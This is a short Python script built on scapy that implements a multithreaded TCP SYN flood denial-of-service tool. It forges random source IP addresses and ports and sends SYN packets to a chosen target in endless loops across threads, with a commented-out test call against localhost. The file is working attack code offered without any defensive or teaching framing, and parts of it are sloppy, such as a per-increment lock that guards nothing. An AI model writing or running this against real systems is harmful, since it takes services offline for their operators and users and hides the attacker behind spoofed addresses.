from scapy.layers.inet import IP, TCP 
from scapy.layers.l2 import Ether
from scapy.sendrecv import send
import threading
import random
import sys
class Denial_of_Service:
    def __init__(self,ip_target,port_target,thread_count):
        self.ip_target = ip_target
        self.port_target = port_target
        self.thread_count = thread_count
        self.packet_count = 0

    def Generate_IP_Source(self):
        return ".".join(str(random.randint(1,254)) for _ in range(4))
    

    def SYN_Flood   (self):
        try:

            
            while True:
                
                spoofed_ip = self.Generate_IP_Source()

                spoofed_port = random.randint(1025,65534)

                ip_layer = IP(src=spoofed_ip, dst=self.ip_target)

                tcp_layer = TCP(sport=spoofed_port, dport=self.port_target, flags="S")

                packet = ip_layer / tcp_layer

                send(packet,verbose = False)

                with threading.Lock():
                    self.packet_count += 1

                

        except KeyboardInterrupt as e:
            print(f"\n [*]Flooding Attack Stopped... {e}")
            print(f"[+] Packets Sent: {self.packet_count}")
        except Exception as e:
            print(f"some mistake on {e}")

    def threading(self):
        print(f"    [~]Starting SYN Flood Attack to [{self.ip_target}]: [{self.port_target}] with thread: [{self.thread_count}]... \n[Press CTRL+C For Stop] ")
        threads=[]
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.SYN_Flood)

            thread.daemon = True
            threads.append(thread)
            thread.start() # Mulai thread

        try:
            while True:
                sys.stdout.write(f"\r[+] Packets Sent: {self.packet_count}")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("\n\n[*] Flooding Attack Stopped.")
            print(f"[+] Packets Sent: {self.packet_count}")
            sys.exit()
        except Exception as e:
            print(f"some mistake on {e}")





# tes = Denial_of_Service("127.0.0.1",80)
# tes.SYN_Flood()


